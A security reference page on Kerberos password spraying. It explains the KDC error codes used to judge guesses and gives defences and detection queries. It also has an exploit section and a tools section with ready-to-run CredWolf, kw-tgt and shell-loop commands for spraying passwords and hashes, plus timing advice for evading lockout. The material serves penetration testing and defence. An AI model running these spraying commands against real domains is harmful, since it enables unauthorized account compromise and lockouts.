# Password Spraying via Kerberos

Password spraying uses Kerberos pre-authentication as an oracle to test credentials across many accounts simultaneously. The Kerberos error codes returned by the KDC reveal not only whether the password was correct, but also account status information, and the attack can be performed without domain membership or elevated privileges -- just network access to port 88.

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/) Brute Force: Password Spraying

## How It Works

In the [AS Exchange](../../protocol/as-exchange.md), when a client sends an AS-REQ with pre-authentication data (an encrypted timestamp), the KDC attempts to decrypt the timestamp using the user's stored key. The KDC's response varies depending on the result:

| KDC Response | Error Code | Meaning |
|-------------|------------|---------|
| AS-REP (success) | N/A | **Correct password** -- valid credentials |
| `KDC_ERR_PREAUTH_FAILED` | 24 (`0x18`) | **Wrong password** -- the encrypted timestamp could not be decrypted |
| `KDC_ERR_CLIENT_REVOKED` | 18 (`0x12`) | Account is **locked or disabled** |
| `KDC_ERR_KEY_EXPIRED` | 23 (`0x17`) | Password is **expired but valid** -- the password is correct |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | 6 (`0x6`) | Account **does not exist** |

The hexadecimal values are how the same codes appear in the Windows events under [Detect](#detect).

!!! tip "Error code 23 confirms the password"
    Error code 23 (`KDC_ERR_KEY_EXPIRED`) is a particularly valuable result during password spraying. It confirms the password is correct even though the account cannot currently authenticate. The attacker knows the credentials and can wait for the user to change their password, or target the account through other means.

### Why Kerberos Instead of NTLM?

Traditional password spraying via SMB or LDAP (NTLM-based) triggers Event ID 4625 (failed logon), which is well-monitored in most environments. Kerberos pre-authentication failures generate different events:

- **Event ID 4771** (Kerberos pre-authentication failed) -- the event a wrong password produces; a Failure event, so it is logged only where failure auditing is on
- **Event ID 4768** (TGT was requested) -- logged for a successful request and for failures other than result codes `0x10` and `0x18`; a wrong password is `0x18`, so it is logged as 4771 instead

Both come from the same audit subcategory, Audit Kerberos Authentication Service. Where that subcategory does not audit failures, or domain controller logs are not collected at all, Kerberos-based spraying can be quieter than NTLM-based approaches.

!!! tip "Use TCP transport for reliable results"
    Password spraying over UDP is unreliable because successful authentications return a full AS-REP containing the TGT, which exceeds the UDP datagram limit. Use TCP transport for reliable results.

### No Domain Membership Required

Password spraying via Kerberos requires only network access to the DC on port 88. The attacker does not need to be domain-joined, does not need an existing account, and does not need LDAP access. The AS-REQ is the first message in the Kerberos flow and accepts any claimed principal name.

```mermaid
sequenceDiagram
    participant Attacker
    participant KDC

    Attacker->>KDC: AS-REQ (user=alice, PA-ENC-TS with <password>)
    KDC->>Attacker: KDC_ERR_PREAUTH_FAILED (wrong password)
    Attacker->>KDC: AS-REQ (user=bob, PA-ENC-TS with <password>)
    KDC->>Attacker: AS-REP (correct password!)
    Attacker->>KDC: AS-REQ (user=charlie, PA-ENC-TS with <password>)
    KDC->>Attacker: KDC_ERR_CLIENT_REVOKED (locked out)
```

---

## Defend

### Account Lockout and Fine-Grained Password Policies { #smart-lockout-and-fine-grained-password-policies }

Configure account lockout policies that limit the number of failed attempts within an observation window. Fine-Grained Password Policies (FGPPs) allow different lockout thresholds for different groups of users.

Smart lockout is a Microsoft Entra ID feature, not a domain controller setting. It locks out sign-ins to Entra ID, and in hybrid deployments Microsoft describes its role as to "filter out attacks before they reach on-premises AD DS" ([Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)). For AS-REQs sent directly to a domain controller, the control is the AD DS account lockout policy below.

```powershell title="View domain password policy and create a Fine-Grained Password Policy"
# View the default domain password policy
Get-ADDefaultDomainPasswordPolicy

# Create a Fine-Grained Password Policy for sensitive accounts
New-ADFineGrainedPasswordPolicy -Name "Strict-Lockout" `
    -Precedence 10 `
    -LockoutThreshold 5 `
    -LockoutObservationWindow "00:30:00" `
    -LockoutDuration "00:30:00" `
    -ComplexityEnabled $true `
    -MinPasswordLength 14
```

!!! warning "Lockout cuts both ways"
    Lockout policies are a double-edged sword. Aggressive lockout thresholds (e.g., 3 attempts) can be weaponized by attackers to lock out legitimate users as a denial-of-service attack. A threshold of 5-10 attempts with a 30-minute observation window is a common compromise.

### Banned Password Lists

Use [Microsoft Entra Password Protection](https://learn.microsoft.com/en-us/entra/identity/authentication/concept-password-ban-bad-on-premises) (its on-premises deployment applies the same global and custom banned password lists to password changes and resets on AD DS domain controllers) or a third-party solution to block commonly sprayed passwords. The top patterns attackers use:

- `Season+Year` (Spring2026, Winter2025)
- `Company+123` (Contoso123, AcmeCorp!)
- `Month+Year` (January2026, April2026!)
- `Welcome1`, `Password1`, `Changeme1`

### MFA for Sensitive Accounts

Multi-factor authentication renders password spraying ineffective for interactive logon, even if the password is guessed correctly. Prioritize MFA for:

- All accounts with administrative privileges
- VPN and remote access accounts
- Accounts with access to sensitive data

### Monitor DC Authentication Events

Ensure that Kerberos authentication events are being collected from domain controllers, not just endpoint logon events. Many organizations monitor workstation Event ID 4625 but miss DC-side Kerberos events entirely.

Enable the following audit policies on all DCs, for both Success and Failure:

- **Audit Kerberos Authentication Service**: logs Event ID 4768 (TGT requests) and 4771 (pre-auth failures)
- **Audit Kerberos Service Ticket Operations**: logs Event ID 4769 (TGS requests)

---

## Detect

### Event ID 4771 Spikes

Event ID 4771 (Kerberos Pre-Authentication Failed) is the most direct signal. A surge of 4771 events from a single source IP targeting multiple accounts indicates spraying.

```text
index=security EventCode=4771
| bin span=5m _time
| stats dc(TargetUserName) as unique_users, count by IpAddress, _time
| where unique_users > 20
```

!!! info "Event 4771 needs its audit policy"
    Event ID 4771 is generated by the audit subcategory 'Audit Kerberos Authentication Service,' which is not enabled by default in all configurations. Verify that this audit policy is active, with Failure auditing, on all domain controllers. See [Kerberos Auditing Policies](../../security/group-policy.md#kerberos-auditing-policies).

### Event ID 4768 Failure Analysis

Event ID 4768 does not show the wrong guesses. Microsoft's description of the event: "This event doesn't generate for Result Codes: 0x10 and 0x18. Event '4771: Kerberos pre-authentication failed.' generates instead." A wrong password is `0x18`, so a filter on 4768 failures alone misses the spray itself. What 4768 adds is the rest of the picture: `0x6` for names that do not exist, `0x12` for accounts that are disabled, expired, or locked out, and a Success event (`0x0`) for each guess that was right. Read the two events together:

```text
index=security (EventCode=4771 OR (EventCode=4768 Status!=0x0))
| bin span=5m _time
| stats dc(TargetUserName) as unique_targets, values(Status) as result_codes, count by IpAddress, _time
| where unique_targets > 20
```

A 4768 Success from a source that has just produced a burst of 4771 events is the result that matters most: it is a guessed password.

### Rate-Based Alerting

Create SIEM rules that trigger when a single source exceeds a threshold of failed pre-authentication attempts within a time window. The numbers on this page are starting points to tune against your own baseline:

- More than **20 unique target accounts** with failures from one IP in **5 minutes** (the threshold used in the queries above)
- More than **3 `KDC_ERR_CLIENT_REVOKED`** (lockout) responses to one IP in **10 minutes** (indicates the sprayer hit locked accounts)

### Honeypot Accounts

Create accounts that should never authenticate. Any Kerberos pre-authentication attempt for these accounts is malicious:

- Use realistic names (`jsmith.admin`, `svc_monitoring`)
- Set strong passwords so they are never compromised via other means
- Configure alerts on Event ID 4768 or 4771 for these specific accounts

---

## Exploit

### 1. Compile a Username List

Gather valid usernames through one or more methods:

- **LDAP enumeration** (requires existing credentials)
- **[User enumeration](../credential-theft/user-enumeration.md)** via Kerberos (no credentials needed)
- **OSINT**: LinkedIn employee names converted to username patterns (`first.last`, `flast`, `firstl`)
- **Email harvesting**: many organizations use email addresses as UPNs

### 2. Select Passwords to Spray

Choose passwords that are statistically common in corporate environments:

```text
Spring2026!
Summer2026!
Welcome1!
Password123
CompanyName2026!
April2026!
```

### 3. Spray One Password at a Time

For each password, send an AS-REQ for every username on the list. After completing one password, wait before trying the next to stay below lockout thresholds.

**Timing guidance** (assuming a typical lockout policy of 5 attempts / 30 minutes):

- Spray one password across all users
- Wait 30-35 minutes (the full observation window plus margin)
- Spray the next password
- Track any `KDC_ERR_CLIENT_REVOKED` responses -- these indicate an account was already near its lockout threshold from legitimate failed attempts

### 4. Classify Results

| Response | Action |
|----------|--------|
| AS-REP | Valid credentials -- use for further access |
| `KDC_ERR_KEY_EXPIRED` (23) | Password is correct but expired -- note for later |
| `KDC_ERR_PREAUTH_FAILED` (24) | Wrong password -- continue spraying |
| `KDC_ERR_CLIENT_REVOKED` (18) | Account locked -- skip in future rounds |

---

## Tools

### CredWolf

[CredWolf](https://github.com/StrongWind1/CredWolf) is a dual-protocol credential validation tool purpose-built for password spraying. It supports passwords, NT hashes, AES keys, and ticket files over both Kerberos and NTLM, with built-in lockout safety controls.

#### Password spraying

```bash
# Spray a single password across a user list
credwolf -d CORP.LOCAL kerberos --kdc-ip 192.0.2.10 -U users.txt -p '<password>'

# Spray multiple passwords from a file
credwolf -d CORP.LOCAL kerberos --kdc-ip 192.0.2.10 -U users.txt -P passwords.txt

# AES256 password derivation (derives AES256 key from password + KDC salt)
credwolf -d CORP.LOCAL kerberos --kdc-ip 192.0.2.10 -U users.txt -p '<password>' -e aes256
```

#### Pass-the-hash and pass-the-key spraying

```bash
# Spray an NT hash as an RC4 key (overpass-the-hash)
credwolf -d CORP.LOCAL kerberos --kdc-ip 192.0.2.10 -U users.txt --rc4-key 31d6cfe0d16ae931b73c59d7e0c089c0 --transport tcp

# Spray RC4 keys from a file
credwolf -d CORP.LOCAL kerberos --kdc-ip 192.0.2.10 -U users.txt --rc4-file rc4_keys.txt --transport tcp

# Spray AES256 keys from a file
credwolf -d CORP.LOCAL kerberos --kdc-ip 192.0.2.10 -U users.txt --aes256-file aes256_keys.txt --transport tcp

# Spray AES128 keys from a file
credwolf -d CORP.LOCAL kerberos --kdc-ip 192.0.2.10 -U users.txt --aes128-file aes128_keys.txt --transport tcp
```

#### Paired credential files and ticket validation

```bash
# Pre-paired user:password file
credwolf -d CORP.LOCAL kerberos --kdc-ip 192.0.2.10 --user-pass-file creds.txt

# Pre-paired user:key file (auto-detects RC4 vs AES256 by key length)
credwolf -d CORP.LOCAL kerberos --kdc-ip 192.0.2.10 --user-key-file pairs.txt --transport tcp

# Validate an existing ticket (auto-detects ccache vs kirbi)
credwolf -d CORP.LOCAL kerberos --kdc-ip 192.0.2.10 -u Administrator --ticket admin.ccache
```

#### Lockout safety

```bash
# 2-second delay with 0.5s random jitter between attempts
credwolf --delay 2 --jitter 0.5 -d CORP.LOCAL kerberos --kdc-ip 192.0.2.10 -U users.txt -P passwords.txt

# Stop after the first valid credential
credwolf --stop-on-success -d CORP.LOCAL kerberos --kdc-ip 192.0.2.10 -U users.txt -P passwords.txt

# Stop after 3 consecutive CLIENT_REVOKED responses (likely causing lockouts)
credwolf --max-lockouts 3 -d CORP.LOCAL kerberos --kdc-ip 192.0.2.10 -U users.txt -P passwords.txt
```

!!! tip "RC4 vs AES request counts"
    RC4 password spraying sends **1 AS-REQ per attempt** (the password is used directly as the RC4 key). AES password spraying sends **2 AS-REQs per attempt**: the first retrieves the per-user salt (no lockout impact), and the second sends the encrypted timestamp (this is the one that counts toward the bad-password counter). The lockout impact is identical -- 1 failed login per wrong password -- but AES generates twice the network traffic.

#### NTLM spraying fallback

For environments where Kerberos is not available (e.g., the attacker cannot reach port 88 but can reach SMB or LDAP), CredWolf also supports NTLM-based spraying:

```bash
# NTLM password spray over SMB (default)
credwolf -d CORP.LOCAL ntlm --dc-ip 192.0.2.10 -U users.txt -P passwords.txt

# NTLM spray over LDAP
credwolf -d CORP.LOCAL ntlm --dc-ip 192.0.2.10 -U users.txt -P passwords.txt --transport ldap
```

### kerbwolf: kw-tgt

`kw-tgt` requests a TGT using provided credentials. While it is not a dedicated spraying tool, it can test individual username/password combinations and its error reporting reveals the KDC's response code.

```bash
# Test a single credential pair
kw-tgt -d CORP.LOCAL --dc-ip 192.0.2.10 -u alice -p '<password>'
```

A successful request produces a ccache file. A failure prints the KDC error code, which reveals whether the password was wrong, the account is locked, or the password is expired.

For batch spraying with `kw-tgt`, a simple shell loop works:

```bash title="Spray a single password across a user list with kw-tgt"
# Spray one password across a user list
while IFS= read -r user; do
  kw-tgt -d CORP.LOCAL --dc-ip 192.0.2.10 -u "$user" -p '<password>' -o "/tmp/${user}.ccache" 2>&1
done < users.txt
```

### Other Spraying Tools

| Tool | Platform | Notes |
|------|----------|-------|
| kerbrute `passwordspray` | Cross-platform (Go) | Purpose-built for Kerberos spraying; fast, handles lockout detection |
| Rubeus `brute` | Windows (.NET) | Spray from a domain-joined machine; supports `/outfile` for results |
| Spray (GitHub) | Python | Simple sprayer with lockout-aware timing |

!!! warning "Respect the lockout policy"
    Always respect the domain's lockout policy during testing. Locking out accounts during a penetration test is disruptive and may violate the rules of engagement. Query the lockout policy first: `Get-ADDefaultDomainPasswordPolicy | Select-Object LockoutThreshold, LockoutObservationWindow`
